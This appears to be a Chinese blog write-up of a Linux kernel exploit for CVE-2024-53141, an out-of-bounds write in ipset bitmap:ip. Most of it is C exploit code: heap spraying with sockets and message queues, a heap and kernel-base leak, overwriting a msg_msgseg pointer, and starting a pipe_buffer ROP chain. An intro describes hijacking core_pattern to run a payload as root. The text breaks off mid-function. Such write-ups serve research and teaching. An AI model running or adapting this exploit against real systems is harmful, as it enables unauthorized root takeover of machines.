<p>​	exp首先利用通过 fork 创建子进程执行 crash 函数，子进程利用 memfd_create 创建匿名内存文件并将当前进程镜像（&#x2F;proc&#x2F;self&#x2F;exe）完整拷贝至该文件描述符（memfd），随后通过 dup2 将其绑定到保留的 fd 666，并循环检查 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern 是否被内核 ROP 链篡改为管道命令 |&#x2F;proc&#x2F;%P&#x2F;fd&#x2F;666（%P 会在崩溃时替换为进程 PID），一旦检测到篡改成功，立即通过解引用空指针 *(size_t *)0 &#x3D; 0 触发段错误，迫使内核执行核心转储处理逻辑——以 root 权限 启动 fd 666 指向的恶意程序（即攻击者预载的提权代码镜像），最终父进程通过 pidfd_getfd 窃取目标进程的标准输入输出流，执行 cat &#x2F;flag 提取敏感数据并触发系统关机（sysrq-trigger），完成从内存文件隐蔽加载、内核漏洞触发到权限升级的完整攻击链。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// prepare a lot unix_socket for spray skbs</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">size_t</span> val = <span class="number">0x400000</span>;</span><br><span class="line">	SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, spray_fd2[i]));</span><br><span class="line">	SYSCHK(SYSCHK(setsockopt(spray_fd2[i][<span class="number">0</span>], SOL_SOCKET, SO_SNDBUF, &amp;val, <span class="number">4</span>)));</span><br><span class="line">	SYSCHK(SYSCHK(setsockopt(spray_fd2[i][<span class="number">1</span>], SOL_SOCKET, SO_SNDBUF, &amp;val, <span class="number">4</span>)));</span><br><span class="line">	SYSCHK(SYSCHK(setsockopt(spray_fd2[i][<span class="number">0</span>], SOL_SOCKET, SO_RCVBUF, &amp;val, <span class="number">4</span>)));</span><br><span class="line">	SYSCHK(SYSCHK(setsockopt(spray_fd2[i][<span class="number">1</span>], SOL_SOCKET, SO_RCVBUF, &amp;val, <span class="number">4</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray a lot skbs ahead for later guess skb chunk addr success rate higher</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x100</span>; j++)</span><br><span class="line">	&#123;</span><br><span class="line">		write(spray_fd2[i][<span class="number">0</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">		write(spray_fd2[i][<span class="number">1</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	该代码通过批量创建 UNIX 域套接字对（AF_UNIX）并操纵其缓冲区参数，实现针对 Linux 内核内存管理机制的系统性预布局。具体原理为：首先通过 socketpair 创建 0x400 对（1024 对）本地流式套接字，每对套接字的两端均通过 setsockopt 将其发送缓冲区（SO_SNDBUF）和接收缓冲区（SO_RCVBUF）设置为 0x400000（4MB），该操作会触发内核调整套接字底层结构体 sock 的 sk_sndbuf 和 sk_rcvbuf 字段值将其设置为0x68000；随后通过嵌套循环向每对套接字的两端持续写入 0x200 字节数据（每次 write 调用），此过程会触发内核协议栈调用 alloc_skb_with_frags 从 skbuff_head_cache 分配 sk_buff 结构体，并通过 kmalloc_reserve 在 kmalloc-cg-1k 缓存池中分配 1k的内存区域进行堆喷，方便后面再给msg_seg结构体的next覆盖成指定堆指针时，该指针指向kmalloc-cg-1k的object的概率更高。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create new unprivileged network IPC namespace to reach vulnerability</span></span><br><span class="line">	SYSCHK(unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWIPC));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create a lot msgqueue for later to spray msg_msg and msg_msgseg </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		msqid[i] = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line">		SYSCHK(msqid[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// prepare another set of unix_sockets for spray skbs</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, spray_fd[i]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// make comment_string be allocated under kmalloc-192</span></span><br><span class="line">	<span class="built_in">memset</span>(comment_string, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">	msg.mtype = <span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> fail = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> sock_fd = netlink_open(NETLINK_NETFILTER);</span><br><span class="line">	<span class="keyword">if</span> (sock_fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to open Netlink socket\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(name, <span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0x800</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// if reach target loop, we spray a lot kmalloc-cg-512 skbs ahead</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">				SYSCHK(write(spray_fd[i][<span class="number">0</span>], buf, <span class="number">0x80</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// allocate target ipset</span></span><br><span class="line">		create_ip_set_kmalloc_1024(sock_fd, name, <span class="string">&quot;bitmap:ip&quot;</span>, AF_INET,i==<span class="number">0x800</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// set bit to each ipset in order to make oob write stop</span></span><br><span class="line">		add_ip_to_set(sock_fd, name, <span class="string">&quot;A&quot;</span>, AF_INET,htonl(<span class="number">-0x35</span>));</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0x800</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// if reach target loop, we spray a lot kmalloc-cg-512 skbs after allocating target ipset</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">				SYSCHK(write(spray_fd[i][<span class="number">1</span>], buf, <span class="number">0x80</span>));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// trigger oob write to keep allocate comment_string to overwrite next chunk(skb) contents as kernel heap</span></span><br><span class="line">	trigger_oob_leak(sock_fd, <span class="string">&quot;2048&quot;</span>, <span class="string">&quot;A&quot;</span>, AF_INET);</span><br></pre></td></tr></table></figure>

<p>​	这里便是触发漏洞的关键代码，首先做一下准备条件，先对于后面堆喷msg_msg结构体以及skb_buff进行准备，之后便是通过创建ip_set来触发漏洞。我们重点关注循环的设计，首先是一直循环创建ipset，每一个ipset都以循环的名字命名，之后当到达2048的时候，进行特殊的处理，首先进行skb_buff堆喷，之后分配ip_set，并且这里有一个flag标志，之后创建完ip_set之后继续进行堆喷。到这里很好理解，实际上就是通过堆喷kmalloc-cg-512，使得之前说的存在越界写的位置可以再skb_buff的object里面写一个堆地址，也就是comment指针（下面会详细阐述如何实现这个漏洞的），这样我们就可以获取一个kmalloc-cg-192的地址，方便后面对于kmalloc-cg-1k的Object地址进行猜测。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_ip_set_kmalloc_1024</span><span class="params">(<span class="type">int</span> sock_fd, <span class="type">const</span> <span class="type">char</span> *set_name, <span class="type">const</span> <span class="type">char</span> *type_name, <span class="type">uint8_t</span> family, <span class="type">int</span> extra)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> mnl_nlmsg_put_header(buf);</span><br><span class="line"></span><br><span class="line">	nlh-&gt;nlmsg_type = IPSET_CMD_CREATE | (<span class="number">6</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">	nlh-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;</span><br><span class="line"></span><br><span class="line">	mnl_nlmsg_put_extra_header(nlh, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);</span><br><span class="line">	mnl_attr_put_strz(nlh, IPSET_ATTR_SETNAME, set_name);</span><br><span class="line">	mnl_attr_put_strz(nlh, IPSET_ATTR_TYPENAME, type_name);</span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_FAMILY, family);</span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_REVISION, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr_data</span> =</span> mnl_attr_nest_start(nlh, IPSET_ATTR_DATA);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr_ip</span> =</span> mnl_attr_nest_start(nlh, IPSET_ATTR_IP);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 0x35*8+0x58 is under kmalloc-cg-512</span></span><br><span class="line">	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(<span class="number">-0x35</span>));</span><br><span class="line"></span><br><span class="line">	mnl_attr_nest_end(nlh, attr_ip);</span><br><span class="line"></span><br><span class="line">	attr_ip = mnl_attr_nest_start(nlh, IPSET_ATTR_IP_TO);</span><br><span class="line">	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(<span class="number">-1</span>));</span><br><span class="line">	mnl_attr_nest_end(nlh, attr_ip);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (extra)</span><br><span class="line">		mnl_attr_put_u32(nlh, IPSET_ATTR_CADT_FLAGS | NLA_F_NET_BYTEORDER, htonl(IPSET_FLAG_WITH_COMMENT));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// map size depend on map = ip_set_alloc(sizeof(*map) + elements * set-&gt;dsize);</span></span><br><span class="line">	<span class="comment">// IPSET_FLAG_WITH_COMMENT cause set-&gt;dsize == 0x8</span></span><br><span class="line">	<span class="comment">// 0x35*0x8 + sizeof(*map) is under kmalloc-cg-512</span></span><br><span class="line"></span><br><span class="line">	mnl_attr_nest_end(nlh, attr_data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> netlink_send(sock_fd, nlh);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	这里就是如何创建ip_set，首先关注一下create_ip_set_kmalloc_1024函数，其实原理很简单，最开始这些步骤就是简单设置一些需要利用ipset通信的配置信息mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);这里就是我之前说的设置协议的版本，如果5开头的kernel之前的版本时不支持ipset6的。之后便是设置first_ip和last_ip，并且对于flag也有详细的要求，只有到达了2048这个object才会单独设置允许添加Comment的ip_set。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">trigger_oob_leak</span><span class="params">(<span class="type">int</span> sock_fd, <span class="type">const</span> <span class="type">char</span> *set_name, <span class="type">const</span> <span class="type">char</span> *cidr, <span class="type">uint8_t</span> family)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> mnl_nlmsg_put_header(buf);</span><br><span class="line"></span><br><span class="line">	nlh-&gt;nlmsg_type = IPSET_CMD_ADD | (<span class="number">6</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">	nlh-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_EXCL;</span><br><span class="line"></span><br><span class="line">	mnl_nlmsg_put_extra_header(nlh, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_PROTOCOL, IPSET_PROTOCOL);</span><br><span class="line">	mnl_attr_put_strz(nlh, IPSET_ATTR_SETNAME, set_name);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_FAMILY, family);</span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_REVISION, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr_data</span> =</span> mnl_attr_nest_start(nlh, IPSET_ATTR_DATA);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr_ip</span> =</span> mnl_attr_nest_start(nlh, IPSET_ATTR_IP);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_u32(nlh, IPSET_ATTR_IPADDR_IPV4 | NLA_F_NET_BYTEORDER, htonl(<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">	mnl_attr_nest_end(nlh, attr_ip);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// IPSET_ATTR_CIDR==3 make `ip` is 0xe0000000 and `ip_to` 0xffffffff</span></span><br><span class="line">	mnl_attr_put_u8(nlh, IPSET_ATTR_CIDR, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	mnl_attr_put_strz(nlh, IPSET_ATTR_COMMENT, comment_string);</span><br><span class="line"></span><br><span class="line">	mnl_attr_nest_end(nlh, attr_data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> netlink_send(sock_fd, nlh);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后对于触发oob读就是利用之前讲述的原理，通过设置IPSET_ATTR_CIDR，可以触发漏洞，并且再下一个object的空间中写入堆地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	recv(spray_fd[i][<span class="number">0</span>], buf, <span class="number">0x80</span>, MSG_PEEK);</span><br><span class="line">	<span class="keyword">if</span> (buf[<span class="number">0</span>])</span><br><span class="line">		pipe_buf_addr = *(<span class="type">size_t</span> *)(&amp;buf[<span class="number">0</span>]);</span><br><span class="line">	recv(spray_fd[i][<span class="number">1</span>], buf, <span class="number">0x80</span>, MSG_PEEK);</span><br><span class="line">	<span class="keyword">if</span> (buf[<span class="number">0</span>])</span><br><span class="line">		pipe_buf_addr = *(<span class="type">size_t</span> *)(&amp;buf[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;leak heap addr 0x%lx\n&quot;</span>, pipe_buf_addr);</span><br><span class="line"><span class="keyword">if</span> (pipe_buf_addr == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We choose a guess addr, hope its under kmalloc-cg-1024</span></span><br><span class="line"><span class="comment">// Later we will reclaim it as pipe_buf</span></span><br><span class="line">pipe_buf_addr &amp;= ~(<span class="number">0x10000000</span> - <span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our guess kernel heap addr 0x%lx\n&quot;</span>, pipe_buf_addr);</span><br></pre></td></tr></table></figure>

<p>​	这里便是对于内核kmalloc-cg-192的地址进行猜测，希望可以猜测的地址可以指向kmalloc-cg-1k的object，至此，完成了对于泄露堆地址的全部内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">sprintf</span>(name, <span class="string">&quot;x%d&quot;</span>, i);</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0x800</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// if reach target loop, we spray a lot kmalloc-cg-2048 msg_msgseg ahead</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">			SYSCHK(msgsnd(msqid[i], &amp;msg, <span class="number">0x1000</span> - <span class="number">0x30</span> + <span class="number">0x800</span> - <span class="number">0x8</span>, <span class="number">0</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// allocate target ipset</span></span><br><span class="line">	create_ip_set_kmalloc_2048(sock_fd, name, <span class="string">&quot;bitmap:ip&quot;</span>, AF_INET,i == <span class="number">0x800</span>);</span><br><span class="line">	<span class="comment">// set bit to each ipset in order to make oob write stop</span></span><br><span class="line">	add_ip_to_set(sock_fd, name, <span class="string">&quot;A&quot;</span>, AF_INET,htonl(<span class="number">-0x40</span> + <span class="number">0x3b</span>));</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0x800</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// if reach target loop, we spray a lot kmalloc-cg-2048 msg_msgseg after allocating target ipset</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">			SYSCHK(msgsnd(msqid[i + <span class="number">0x1000</span>], &amp;msg, <span class="number">0x1000</span> - <span class="number">0x30</span> + <span class="number">0x800</span> - <span class="number">0x8</span>, <span class="number">0</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger oob write to overwrite next chunk(msg_msgseg&#x27;s next) as our guessed addr</span></span><br><span class="line">trigger_oob_write(sock_fd, <span class="string">&quot;x2048&quot;</span>, <span class="string">&quot;A&quot;</span>, AF_INET);</span><br></pre></td></tr></table></figure>

<p>​	之后便是利用猜测到的堆地址进行越界写，这里需要注意的是htonl(-0x40 + 0x3b)部分，实际上就是对于结束地址的检测，这里可以通过计算来获取，因为获取到kmalloc-cg-2048的内存实际上是比bitmap_ip预设的内存大的，因此需要覆盖很多地址才可以覆盖到下一个Object，这里会从0x40的object开始写内容，其实已经到了下一个object了（8byte的Bitmap只能存储64位），所以我们要计算一下需要覆盖多少才能到下一个object，bitmap_ip结构体本身大小是0x58，扩展域是0x40 * 0x10 &#x3D; 0x400，因此有0x800 - 0x458 &#x3D; 0x3a8的内存来覆盖，一次覆盖0x10大小的内容，需要覆盖0x3b次内容才可以实现越界写。</p>
<p><img src="/images/CVE-2024-53141/1742267449936.jpg" alt="1742267449936"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// free all msg_msgseg, it also free our guessed addr</span></span><br><span class="line"><span class="comment">// we don&#x27;t need to read to prevent stuck at deadloop</span></span><br><span class="line"><span class="type">char</span>* read_only = SYSCHK(mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ,MAP_ANON|MAP_PRIVATE,<span class="number">-1</span>,<span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span>; i++)</span><br><span class="line">	msgrcv(msqid[i], read_only, <span class="number">0x1000</span> - <span class="number">0x30</span> + <span class="number">0x800</span> - <span class="number">0x8</span>, <span class="number">1</span>, IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// We reclaim our guessed addr as pipe_buf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NPIPE; i++)</span><br><span class="line">	SYSCHK(pipe(pipe_fd[i]));</span><br><span class="line"></span><br><span class="line"><span class="comment">// write data on pipe to leak kernel base address</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NPIPE; i++)</span><br><span class="line">&#123;</span><br><span class="line">	SYSCHK(write(pipe_fd[i][<span class="number">1</span>], buf, <span class="number">0x1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// read and free skb,</span></span><br><span class="line"><span class="comment">// if it has non-null contents, it means it should be pipe_buf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x100</span>; j++)</span><br><span class="line">	&#123;</span><br><span class="line">		read(spray_fd2[i][<span class="number">0</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">		KERNEL_BASE = *(<span class="type">size_t</span>*)&amp;buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(KERNEL_BASE)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		read(spray_fd2[i][<span class="number">1</span>], buf, <span class="number">0x200</span>);</span><br><span class="line">		KERNEL_BASE = *(<span class="type">size_t</span>*)&amp;buf[<span class="number">0x10</span>];</span><br><span class="line">		<span class="keyword">if</span>(KERNEL_BASE)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(KERNEL_BASE)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel base</span></span><br><span class="line">KERNEL_BASE -= ANON_PIPE_BUF_OPS_OFF; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;KERNEL_BASE %lx\n&quot;</span>, KERNEL_BASE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// craft pipe_buffer with rop chain</span></span><br><span class="line">build_fake_pipe_buffer_with_rop_chain(pipe_buf_addr, (<span class="type">char</span> *)buf);</span><br></pre></td></tr></table></figure>

<p>​	之后便是对于msg_msg结构体free，之后再利用pipebuffer进行堆喷，并且读取对应结构体信息，以此获取堆基地址，根据这个基地址我们就可以进行rop链，覆盖pipe_buffer的release指针，最终实现攻击效果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">build_fake_pipe_buffer_with_rop_chain</span><span class="params">(<span class="type">size_t</span> rop_addr, <span class="type">char</span> 